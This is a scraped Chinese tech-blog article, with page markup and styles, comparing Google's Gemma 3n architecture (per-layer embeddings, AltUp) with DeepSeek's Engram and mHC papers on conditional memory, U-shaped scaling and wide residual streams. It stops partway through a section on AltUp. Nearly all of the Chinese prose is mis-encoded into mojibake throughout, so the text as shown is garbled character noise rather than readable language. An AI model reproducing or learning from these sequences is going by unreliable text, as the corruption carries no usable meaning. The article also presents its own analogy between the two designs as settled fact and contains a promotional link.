                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Google åœ¨ 2025 å¹´ 6 æœˆæ¨å‡º Gemma 3n æ—¶ï¼ŒæŠ€æœ¯åœˆçš„åå“æˆªç„¶ä¸¤æã€‚</p>
<p>å·¥ç¨‹å›¢é˜Ÿä¸ºå…¶åœ¨ç§»åŠ¨ç«¯çš„æè‡´è½»é‡åŒ–æŠ˜æœâ€”â€”2GB å†…å­˜å³å¯è¿è¡Œ 80 äº¿å‚æ•°æ¨¡å‹ï¼Œå¤šæ¨¡æ€æ¨ç†æµç•…å¦‚å¸¸ï¼›è€Œå­¦æœ¯ç•Œå´å¯¹ PLEï¼ˆPer-Layer Embeddingsï¼‰ä¸ AltUp ç­‰éä¼ ç»Ÿè®¾è®¡å¿ƒå­˜ç–‘è™‘ï¼Œè§†å…¶ä¸ºä¸ºé€‚é…ç¡¬ä»¶è€Œå¼ºè¡Œå‹ç¼©çš„å·¥ç¨‹æ·å¾„ã€‚</p>
<p>ç›´åˆ°åŠå¹´åï¼Œ2026 å¹´ 1 æœˆï¼ŒDeepSeek è¿ç»­å‘å¸ƒ mHCä¸ Engramä¸¤ç¯‡å¥ åŸºæ€§è®ºæ–‡ã€‚</p>
<p>æ·±å…¥å‰–æå…¶æ ¸å¿ƒâ€”â€”U å‹ Scaling Law ä¸æµå½¢çº¦æŸï¼ˆManifold Constraintsï¼‰â€”â€”æˆ‘ä»¬æ¸…æ™°çœ‹åˆ°ï¼š</p>
<p>DeepSeek é€šè¿‡æ•°å­¦æ¨å¯¼å¾—å‡ºçš„æœ€ä¼˜æ¶æ„èŒƒå¼ï¼Œç«Ÿä¸ Google åŠå¹´å‰å‡­ç›´è§‰æ„å»ºçš„ Gemma 3n å½¢æˆæƒŠäººå…±æŒ¯ã€‚</p>
<p>Gemma 3n çš„ PLEï¼Œå…¶æœ¬è´¨æ­£æ˜¯ DeepSeek åœ¨ Engram ä¸­è¯æ˜é«˜æ•ˆçš„â€œæ¡ä»¶è®°å¿†â€æœºåˆ¶ï¼šå°†é™æ€çŸ¥è¯†åµŒå…¥ä½ç»´å¯æŸ¥è¡¨ç»“æ„ï¼Œå‰¥ç¦»æ¨ç†è´Ÿæ‹…ï¼›</p>
<p>Gemma 3n çš„ AltUpï¼Œåˆ™åœ¨å®ç°å±‚é¢æ„æˆäº† mHC ç†è®ºä¸­â€œå®½æ®‹å·®æµç¨€ç–æ‰©å±•â€çš„ä¸€ä¸ªå…·ä½“å®ä¾‹ï¼šä»¥éå¯¹ç§°å‚æ•°æ›´æ–°ç­–ç•¥ï¼Œåœ¨ä¸å¢åŠ æ˜¾å­˜å¼€é”€çš„å‰æä¸‹ï¼Œç¨³å®šæ‰©å±•ä¿¡æ¯é€šè·¯ã€‚</p>
<p>è¿™ç»éå¶ç„¶çš„è¶‹åŒï¼Œè€Œæ˜¯æ¶æ„æ¼”è¿›çš„å¿…ç„¶äº¤æ±‡ã€‚DeepSeek çš„ç†è®ºï¼Œä¸º Gemma 3n çš„å·¥ç¨‹é€‰æ‹©æä¾›äº†å‰æ‰€æœªæœ‰çš„æ•°å­¦åˆæ³•æ€§ã€‚</p>
<p>Google ç”¨ç›´è§‰è¸©ä¸­äº†æœ€ä¼˜è§£çš„è„‰æï¼Œè€Œ DeepSeek ç”¨å…¬å¼è¿˜åŸäº†å®ƒçš„è¯æ˜ã€‚</p>
<p>æœ¬æ–‡å°†ä»¥ DeepSeek çš„æ–°ç†è®ºä¸ºé€é•œï¼Œè§£æ„ Gemma 3n çš„é»‘ç®±è®¾è®¡ï¼Œæ­ç¤ºä¸¤ä¸ªé¡¶å°–å›¢é˜Ÿå¦‚ä½•åœ¨ä¸åŒæ—¶é—´ã€ä¸åŒè·¯å¾„ä¸Šï¼Œå…±åŒå¼€è¾Ÿäº†å¤§æ¨¡å‹æ¶æ„çš„ç¬¬ä¸‰æ¡é“è·¯â€”â€”ä¸€æ¡ä¸ä¾èµ–çº¯å‚æ•°å †ç Œï¼Œè€Œä»¥â€œè®°å¿†åˆ†ç¦»â€ä¸â€œçº¦æŸç¨³å®šâ€ä¸ºæ”¯æŸ±çš„é«˜æ•ˆä¹‹è·¯ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer"><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨æ™ºæ³ŠAIã€‚</strong></a></p>
<h2 data-id="heading-0">01.é™æ€è®°å¿†çš„Scaling Law</h2>
<p>Gemma 3n æ¶æ„ä¸­æœ€å¼•äººäº‰è®®çš„åˆ›æ–°ï¼Œä½“ç°åœ¨å…¶ Embedding çš„å®ç°æœºåˆ¶ä¸Šã€‚</p>
<p>ä¸ä¼ ç»Ÿ Transformer ä»…åœ¨è¾“å…¥ä¸è¾“å‡ºç«¯éƒ¨ç½² Embedding çš„è®¾è®¡ä¸åŒï¼ŒGemma 3n ä¸ºæ¯ä¸€å±‚éƒ½é…ç½®äº†ç‹¬ç«‹çš„é™æ€ Embedding è¡¨ï¼ˆæœ¬æ–‡å°†è¿™ä¸€ç‰¹æ€§å‘½åä¸º PLEï¼ŒPer-Layer Embeddingsï¼‰ã€‚</p>
<p>æ® Google çš„å·¥ç¨‹é˜é‡Šï¼Œæ­¤ä¸¾æ—¨åœ¨ååŒ NPU/CPU çš„å¼‚æ„è®¡ç®—èƒ½åŠ›ï¼Œå€ŸåŠ© Conditional parameter loading æŠ€æœ¯ï¼Œå°†è¶…è¿‡ 2B çš„ PLE å‚æ•°åŠ¨æ€å¸è½½è‡³ç³»ç»Ÿå†…å­˜ï¼Œä»è€Œç¡®ä¿æ ¸å¿ƒçš„ MLP ä¸ Attention æ¨¡å—å§‹ç»ˆåœ¨ NPU ä¸Šä¿æŒé«˜æ•ˆè¿è¡Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb3238224dca4cadacaf5f2fcbd2fdee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=NOBEtyXJj5nF3qmOFR%2BJIlhW59I%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾1. Gemma 3n çš„å‚æ•°åˆ†å¸ƒä¸æœ‰æ•ˆå†…å­˜è´Ÿè½½å¯¹æ¯”ã€‚</p>
<p>è¯¥å›¾æ‰€ç¤ºæ•°æ®è¡¨æ˜ï¼Œå€ŸåŠ© PLE æŠ€æœ¯ï¼Œæ¨¡å‹èƒ½å¤Ÿå°†ç»å¤§éƒ¨åˆ†å‚æ•°è¿ç§»è‡³ç³»ç»Ÿå†…å­˜ï¼Œä»…åœ¨è®¡ç®—å•å…ƒä¸­ä¿ç•™å…³é”®å‚æ•°ï¼Œä»è€Œè¾¾æˆå“è¶Šçš„å‚æ•°åˆ©ç”¨æ•ˆç‡ã€‚</p>
<p>DeepSeek çš„ Engram è®ºæ–‡ä¸ä»…ä»¥å®è¯éªŒè¯äº†è¯¥æ¶æ„å¯æ˜¾è‘—é™ä½å†…å­˜å¼€é”€ï¼Œæ›´é€šè¿‡ç»“æ„æ¸…æ™°çš„å›¾ç¤ºï¼Œç³»ç»Ÿæ€§åœ°é˜æ˜äº†å…¶èƒŒåçš„ç†è®ºåŸå‹ã€‚</p>
<h3 data-id="heading-1">1.1 æœºç†è¿˜åŸ</h3>
<p>Engram ä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ N-gram ç»Ÿè®¡è¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå…·å¤‡å¯å¾®åˆ†ç‰¹æ€§çš„ç¥ç»æ¨¡å—ã€‚</p>
<p>DeepSeek åœ¨è®ºæ–‡å¼€ç¯‡å³æå‡ºå…¶æ ¸å¿ƒæ€æƒ³ï¼šå¯¹ç»å…¸çš„ N-gram æŸ¥è¡¨æœºåˆ¶è¿›è¡Œç¥ç»åŒ–é‡æ„ï¼Œä½¿å…¶èƒ½å¤Ÿä½œä¸ºâ€Œæ¡ä»¶è®°å¿†â€Œï¼ˆConditional Memoryï¼‰æ— ç¼åµŒå…¥æ·±åº¦ç¥ç»ç½‘ç»œæ¶æ„ä¹‹ä¸­ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c80217522a04d29982cf53d845eba00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=GR33C36z6J83rh%2F%2FIHmb0ApUYHw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾2. Engram çš„æ¦‚å¿µæ¨¡å‹ã€‚å®ƒå±•ç¤ºäº†å¦‚ä½•å°†ç¦»æ•£çš„ N-gram ç»Ÿè®¡ä¿¡æ¯è½¬åŒ–ä¸ºå¯å¾®çš„ Embedding æŸ¥æ‰¾æ“ä½œï¼Œä»è€Œå¼¥è¡¥ Transformer åœ¨çŸ¥è¯†æ£€ç´¢ä¸Šçš„çŸ­æ¿ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/948e5fc889104d21a03fb902482f0df4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=atqgih9KFc%2FEzkc2UGEnEyGjBMQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8da59ed1c43f44aaa6ca0bea8ac09fb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=4xFmURTu4IuWrLnPPkaJ23ENq68%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾3. Engram æ¨¡å—çš„é›†æˆæ¶æ„ç¤ºæ„å›¾ã€‚å·¦ä¾§ä¸ºæ ‡å‡† Transformer å±‚ï¼ˆè®¡ç®—ï¼‰ï¼Œå³ä¾§ä¸º Engram æ¨¡å—ï¼ˆå­˜å‚¨ï¼‰ã€‚</p>
<p>é€šè¿‡ç®€å•çš„æŸ¥è¡¨ï¼ˆLookupï¼‰å’ŒæŠ•å½±ï¼ˆProjectionï¼‰ï¼Œé™æ€è®°å¿†è¢«æ— ç¼èå…¥åˆ°ç¥ç»ç½‘ç»œçš„éšçŠ¶æ€æµä¸­ã€‚è¿™æ­£æ˜¯ Gemma 3n PLE æœºåˆ¶çš„æ•°å­¦è§£å‰–å›¾ã€‚</p>
<h3 data-id="heading-2">1.2 å¯»æ‰¾ Loss çš„æœ€ä½ç‚¹ï¼šU å‹æ›²çº¿</h3>
<p>åœ¨æŠŠæ¡æ¶æ„æœ¬è´¨åï¼ŒDeepSeek è¿›ä¸€æ­¥å‡ç»ƒå‡º â€ŒSparsity Allocationâ€Œï¼ˆç¨€ç–åˆ†é…ï¼‰è¿™ä¸€æ ¸å¿ƒè®®é¢˜ã€‚</p>
<p>åŸºäºæµ·é‡å®éªŒï¼ŒDeepSeek æ­ç¤ºï¼šå½“æ¨¡å‹æ€»å‚æ•°è§„æ¨¡æ’å®šæ—¶ï¼Œâ€Œé™æ€è®°å¿†å‚æ•°â€Œï¼ˆEngram/PLEï¼‰ä¸â€ŒåŠ¨æ€è®¡ç®—å‚æ•°â€Œï¼ˆMLP/Attentionï¼‰ä¹‹é—´çš„é…æ¯”ï¼Œæˆä¸ºå·¦å³æ¨¡å‹è¡¨ç°çš„å…³é”®å› å­ã€‚</p>
<p>è§‚æµ‹åˆ°çš„éªŒè¯é›† Loss æ›²çº¿ï¼Œæ¸…æ™°å‘ˆç°å‡ºå…¸å‹çš„ â€ŒU å‹ Scaling Lawâ€Œï¼Œéšé™æ€å‚æ•°æ¯”ä¾‹ä¸Šå‡è€Œå…ˆé™åå‡ã€‚</p>
<p>é‡åŒ–ç»“æœæŒ‡å‡ºï¼Œæœ€ä¼˜é™æ€å‚æ•°å æ¯”å¹¶éé›¶å€¼ï¼Œè€Œæ˜¯ç¨³å®šæ”¶æ•›äº â€Œ10% â€“ 30%â€Œ åŒºé—´å†…ï¼ˆå…·ä½“æ•°å€¼ä¾æ€»å‚æ•°é‡è€Œå¼‚ï¼‰ã€‚</p>
<p>ç”±æ­¤å¯å¾—ï¼šå°†ç›¸å½“å¯è§‚çš„å‚æ•°èµ„æºæŠ•å‘â€œæ­»è®°ç¡¬èƒŒâ€ï¼ˆæŸ¥è¡¨ï¼‰æœºåˆ¶ï¼Œéä½†æœªé€ æˆæµªè´¹ï¼Œåè€Œæœ‰æ•ˆè…¾æŒªå‡ºç¥ç»ç½‘ç»œçš„è®¡ç®—èµ„æºï¼Œä½¿å…¶æ›´ä¸“æ³¨åº”å¯¹é«˜é˜¶é€»è¾‘æ¨ç†ä»»åŠ¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c170cb3750447f783c5bd6403e626cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=vG1XU7ek6F4bRgBirJiC6EkGkAk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾4. æ¨ªè½´ä¸º Engramï¼ˆé™æ€å‚æ•°ï¼‰å æ¯”ï¼Œçºµè½´ä¸º Validation Lossã€‚</p>
<p>å¯ä»¥çœ‹åˆ°æ›²çº¿å‘ˆç°æ¸…æ™°çš„ U å‹ï¼Œæœ€ä½ç‚¹å¹¶éçº¯ MLP æ¨¡å‹ï¼Œè€Œæ˜¯æ··åˆæ¶æ„ã€‚è¿™ä»ç†è®ºä¸ŠèƒŒä¹¦äº† Gemma 3n åˆ†é…å¤§é‡å‚æ•°ç»™ PLE çš„åˆç†æ€§ã€‚</p>
<h3 data-id="heading-3">1.3 å±‚çº§åŒ–æ˜¯å…³é”®</h3>
<p>Gemma 3n çš„ PLE ä»¥åˆ†å±‚æŒ‚è½½ï¼ˆPer-Layerï¼‰ä¸ºæ ¸å¿ƒè®¾è®¡ï¼Œè¿™ä¸€æ¶æ„é€‰æ‹©å¹¶ééšæ„ï¼Œè€Œæ˜¯æºäº DeepSeek åœ¨ Engram è®ºæ–‡ä¸­æ­ç¤ºçš„æ·±å±‚è§„å¾‹ï¼šä»–ä»¬ä¸ä»…éªŒè¯äº†å¯è¡Œæ€§ï¼Œæ›´æ˜ç¡®äº†å®ç°çš„å¿…è¦è·¯å¾„ã€‚</p>
<p>åœ¨ Engram çš„æ¶ˆèå®éªŒä¸­ï¼Œæ’å…¥ä½ç½®è¢«è¯æ˜æ˜¯æ€§èƒ½çš„å…³é”®å˜é‡ï¼š</p>
<p>è‹¥å°†æŸ¥è¡¨æœºåˆ¶ä»…ç½®äº Input Layerï¼ˆLayer 0ï¼‰ï¼Œå¦‚åŒä¼ ç»Ÿ N-gram æ¨¡å‹é‚£æ ·ï¼Œæ¨¡å‹å°šç¼ºä¹å……åˆ†çš„è¯­ä¹‰ä¸Šä¸‹æ–‡æ”¯æ’‘æœ‰æ•ˆé—¨æ§ï¼ˆGatingï¼‰ï¼Œå› è€Œå¯¹æ•´ä½“æ€§èƒ½çš„å¢ç›Šå‡ ä¹å¯ä»¥å¿½ç•¥ã€‚</p>
<p>å”¯æœ‰å°† Engram ç½®äºç½‘ç»œä¸­é—´å±‚ï¼Œå€ŸåŠ©æ·±å±‚æ¶æ„æ‰€æ„å»ºçš„ Context æ¥å¼•å¯¼é™æ€çŸ¥è¯†çš„ç²¾å‡†æ£€ç´¢ä¸åŠ¨æ€èåˆï¼Œæ–¹èƒ½æ˜¾è‘—å‹ä½ PPLï¼ˆå›°æƒ‘åº¦ï¼‰ã€‚</p>
<p>è¿™æ­£æ˜¯ Gemma 3n å¿…é¡»å°† PLE å¤æ‚åŒ–ã€å¹¶åˆ†æ•£éƒ¨ç½²äºæ¯ä¸€ä¸ª Transformer Block çš„æ ¹æœ¬åŸå› ã€‚</p>
<p>ä»è®¡ç®—æœºåˆ¶ä¸Šçœ‹ï¼ŒDeepSeek å¼ºè°ƒ Engram çš„æœ¬è´¨ä¼˜åŠ¿åœ¨äºä¸Šä¸‹æ–‡æ„ŸçŸ¥é—¨æ§ï¼ˆContext-aware Gatingï¼‰ã€‚</p>
<p>å…¶é‡‡ç”¨äº†ä¸€ç§é«˜æ•ˆç‡çš„å¯¹æ•°æ¦‚ç‡èåˆç­–ç•¥ï¼šç›´æ¥å°† Engram æŸ¥è¡¨æ‰€å¾—çš„ Logitsï¼Œç»ç”±é—¨æ§æƒé‡åŠ æƒåï¼Œçº¿æ€§å åŠ è‡³ç¥ç»ç½‘ç»œè¾“å‡ºçš„ Logits ä¸Šã€‚</p>
<p>è¯¥è®¾è®¡å½»åº•è§„é¿äº†ç¹ççš„æ¦‚ç‡æ’å€¼è¿ç®—ï¼Œä¸ Gemma 3n åœ¨æ¨ç†é˜¶æ®µâ€œå¹¶è¡Œè®¡ç®—ç¥ç»ç½‘ç»œã€å®æ—¶æŸ¥è¡¨ã€æœ€ç»ˆåŠ æƒèåˆâ€çš„å·¥ç¨‹å®è·µé«˜åº¦ä¸€è‡´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa20719c879341aaa94a7b0d6c2e761c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=Oc8c0i%2FTHphYvI%2BVLfN2W7YXeJw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾5. Engram é—¨æ§æœºåˆ¶çš„å¯è§†åŒ–ã€‚çº¢è‰²åŒºåŸŸè¡¨ç¤ºé—¨æ§æ¿€æ´»ï¼Œæ„å‘³ç€æ¨¡å‹åœ¨å¤„ç†ç‰¹å®šè¯ç»„ï¼ˆå¦‚å®ä½“åï¼‰æ—¶ï¼Œä¼šé«˜åº¦ä¾èµ–é™æ€è®°å¿†è¡¨çš„æŸ¥è¡¨ç»“æœï¼Œè€Œéç¥ç»ç½‘ç»œçš„æ¨ç†</p>
<h2 data-id="heading-4">02.å®½åº¦çš„è¾¹ç•Œ</h2>
<p>é™¤äº†è®°å¿†ä¹‹å¤–ï¼ŒGemma 3n çš„å¦ä¸€æ˜¾è‘—ç‰¹å¾æ˜¯å…¶â€œå®½â€æ€§ã€‚ä¸ºå®ç°ç«¯ä¾§çš„å¹¶è¡ŒåŠ é€Ÿï¼Œä¸šç•Œæ™®éæ¨æµ‹å…¶é‡‡ç”¨äº†ç±»ä¼¼ AltUp (Alternating Updates) çš„æœºåˆ¶ä»¥æ‹“å±•æ¨¡å‹å®½åº¦ã€‚</p>
<p>å°½ç®¡ DeepSeek çš„ mHC è®ºæ–‡èšç„¦äºæ›´æ™®é€‚çš„è¶…å®½ç½‘ç»œè®­ç»ƒè®®é¢˜ï¼Œå…¶ç†è®ºæ¡†æ¶å´ç²¾å‡†åˆ»ç”»äº† Gemma 3n å®½æ¶æ„æ‰€éµå¾ªçš„è®¾è®¡è¾¹ç•Œã€‚</p>
<h3 data-id="heading-5">2.1 ä»€ä¹ˆæ˜¯å®½ç½‘ç»œåŠå…¶ä»£ä»·ï¼Ÿ</h3>
<p>DeepSeek åœ¨è®ºæ–‡å¼€ç¯‡å®šä¹‰äº† Hyper-Connections (HC)ï¼Œè¿™æ˜¯ä¸€ç§æ‰“ç ´ä¼ ç»Ÿæ®‹å·®ç½‘ç»œï¼ˆResNetï¼‰å®½åº¦é™åˆ¶çš„æ¶æ„ã€‚</p>
<p>é€šè¿‡æå¤§åœ°æ‰©å±•æ®‹å·®æµçš„å®½åº¦ï¼Œæ¨¡å‹å¯ä»¥è·å¾—æé«˜çš„å¹¶è¡Œå¤„ç†èƒ½åŠ›å’Œå®¹é‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/565dcb66a769479cbbe2671f82c1d41c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=zJWMB2jrErupfECLF%2B0gVqcHTyI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾6. Hyper-Connections (HC) æ¶æ„ä¸ä¼ ç»Ÿæ®‹å·®è¿æ¥çš„å¯¹æ¯”ã€‚</p>
<p>HC é€šè¿‡å¤§å¹…æ‹“å®½æ®‹å·®å±‚çš„å®½åº¦ä»¥æå‡æ¨¡å‹å®¹é‡ï¼Œè¿™ä¸€ç­–ç•¥ä¸ Gemma 3n è‡´åŠ›äºç«¯ä¾§å¹¶è¡Œè®¡ç®—çš„æ¶æ„ç†å¿µé«˜åº¦å¥‘åˆã€‚</p>
<p>ä½† DeepSeek æ­ç¤ºï¼Œè¯¥è®¾è®¡æ½œè—ä¸€é¡¹å…³é”®ç¼ºé™·ï¼šå½“å®½åº¦è¿‡åº¦æ‰©å¼ æ—¶ï¼Œå°†æ‰°åŠ¨æ’ç­‰æ˜ å°„ï¼ˆIdentity Mappingï¼‰æ‰€ä¾èµ–çš„æ–¹å·®ç¨³å®šæ€§ã€‚</p>
<p>è‹¥ç¼ºä¹æœ‰æ•ˆçº¦æŸï¼Œæ·±å±‚ç½‘ç»œä¸­çš„ä¿¡å·æ–¹å·®å°†è¿…é€Ÿè†¨èƒ€ï¼Œè¿›è€Œå¼•å‘ Jacobian çŸ©é˜µå¥‡å¼‚å€¼åˆ†å¸ƒçš„å…¨é¢å¤±è¡¡ã€‚</p>
<p>ä¸‹å›¾æ¸…æ™°å±•ç¤ºäº†è¿™ç§å´©å¡Œç°è±¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6721d59b1dd4d2fbd7ca0125b7186b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=vIFHsBCt3W%2FU43R3iz9QCcNRtbA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾7. å·¦å›¾æ˜¾ç¤ºæ™®é€šå®½ç½‘ç»œéšç€æ·±åº¦å¢åŠ ï¼Œè®­ç»ƒ Loss å’Œæ¢¯åº¦è¿…é€Ÿå‘æ•£ï¼›å³å›¾æ˜¾ç¤ºå¼•å…¥æµå½¢çº¦æŸï¼ˆManifold Constraintï¼‰åï¼Œæ¨¡å‹è®­ç»ƒä¿æŒç¨³å®šã€‚</p>
<h3 data-id="heading-6">2.2 AltUp çš„ç¨€ç–è¿‘ä¼¼</h3>
<p>é¢å¯¹â€œå®½åº¦æ‰©å±•å¼•å‘çš„è®­ç»ƒå´©å¡Œâ€è¿™ä¸€æŒ‘æˆ˜ï¼ŒGoogle åœ¨ AltUp è®ºæ–‡ä¸­æå‡ºäº†ä¸€ç§æå…·å·¥ç¨‹æ™ºæ…§çš„è§„é¿è·¯å¾„ã€‚</p>
<p>ä¸ºåŒæ­¥ç¼“è§£è®¡ç®—è´Ÿæ‹…ä¸è®­ç»ƒä¸ç¨³çš„åŒé‡å›°å¢ƒï¼ŒAltUp å¼•å…¥äº†é¢„æµ‹-æ ¡æ­£ï¼ˆPredictor-Correctorï¼‰æ¡†æ¶ã€‚</p>
<p>å®ƒå¹¶æœªç›´æ¥æ‰§è¡Œè¶…å®½ç¨ å¯†çŸ©é˜µçš„å®Œæ•´è¿ç®—ï¼Œè€Œæ˜¯å°†é«˜ç»´å‘é‡åˆ’åˆ†ä¸ºè‹¥å¹² Blockã€‚åœ¨æ¯è½®æ¨ç†ä¸­ï¼Œå…ˆé€šè¿‡è½»é‡é¢„æµ‹æ¨¡å—é”å®šæ´»è·ƒ Blockï¼Œå†ä»…å¯¹è¿™äº›å­é›†è¿›è¡Œå®é™…è®¡ç®—ã€‚</p>
